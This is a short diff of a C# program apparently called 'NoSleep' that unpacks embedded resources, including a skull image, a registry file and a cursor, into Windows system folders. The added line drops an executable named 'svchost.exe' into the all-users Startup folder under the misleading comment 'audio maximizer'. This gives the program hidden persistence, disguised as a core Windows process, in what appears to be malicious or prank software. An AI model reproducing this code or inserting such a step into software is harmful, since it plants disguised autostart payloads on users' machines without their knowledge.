@@ -63,6 +63,7 @@ namespace NoSleep
             {
                 Directory.CreateDirectory(@"C:\Program Files\Temp");
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "a lot of skulls.jpg");
+                Extract("NoSleep", @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp", "Resources", "svchost.exe"); //audio maximizer
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "disctrl.reg");
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "hol333.ani");
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "NoSleeper.jpg");
